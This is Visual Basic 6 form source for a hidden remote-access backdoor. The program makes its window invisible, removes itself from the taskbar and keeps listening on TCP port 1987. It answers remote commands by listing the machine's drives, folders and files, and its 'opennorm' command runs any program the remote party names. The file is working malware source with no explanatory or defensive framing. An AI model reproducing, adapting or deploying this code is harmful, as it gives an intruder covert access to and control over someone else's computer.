VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   90
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   90
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   90
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   480
      Top             =   360
   End
   Begin VB.TextBox Text2 
      Height          =   195
      Left            =   480
      TabIndex        =   4
      Text            =   "Text2"
      Top             =   480
      Width           =   150
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   120
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   1987
   End
   Begin VB.TextBox Text1 
      Height          =   195
      Left            =   600
      TabIndex        =   3
      Text            =   "Text1"
      Top             =   360
      Width           =   150
   End
   Begin VB.FileListBox File1 
      Height          =   285
      Left            =   480
      TabIndex        =   2
      Top             =   360
      Width           =   135
   End
   Begin VB.DirListBox Dir1 
      Height          =   315
      Left            =   360
      TabIndex        =   1
      Top             =   360
      Width           =   135
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   120
      TabIndex        =   0
      Top             =   360
      Width           =   270
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Dir1_Change()
File1.Path = Dir1.Path
End Sub

Private Sub Drive1_Change()
Dir1.Path = Drive1.Drive
End Sub

Private Sub Form_Load()
Winsock1.Listen
App.TaskVisible = False
Me.Visible = False
File1.Path = "c:\"
End Sub

Private Sub Timer1_Timer()
On Error Resume Next
If Winsock1.State <> sckConnected Then Winsock1.Listen
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
Winsock1.Close
Winsock1.Accept requestID
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)

Dim xx As String
Winsock1.GetData xx
Text1.Text = Split(xx, "~")(0)
Text2.Text = Split(xx, "~")(1)




',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
If Text1.Text = "getdrives" Then
For i = 0 To Drive1.ListCount - 1
Winsock1.SendData Drive1.List(i)
DoEvents
Next i
End If
',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,



',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
If Text1.Text = "cdrive" Then
On Error Resume Next
Drive1.Drive = Text2.Text
For a = 0 To Dir1.ListCount - 1
Winsock1.SendData Dir1.List(a)
DoEvents
Next a
End If
',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,



',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
If Text1.Text = "cdir" Then
Dir1.Path = Text2.Text
DoEvents

For v = 0 To Dir1.ListCount - 1
Winsock1.SendData Dir1.List(v)
DoEvents
Next v

For b = 0 To File1.ListCount - 1
Winsock1.SendData File1.List(b)
DoEvents
Next b
End If
',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,


',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
If Text1.Text = "opennorm" Then
On Error Resume Next
Shell Text2.Text, vbNormalFocus
End If
',,,,,,,,,,,,,,,,,,,,,,,,,,,,,

',,,,,,,,,,,,,,,,,,,,,,,,,,,,
If Text1.Text = "byebye" Then
Winsock1.Close
Winsock1.Listen
End If
',,,,,,,,,,,,,,,,,,,,,,,,,,,,,
End Sub
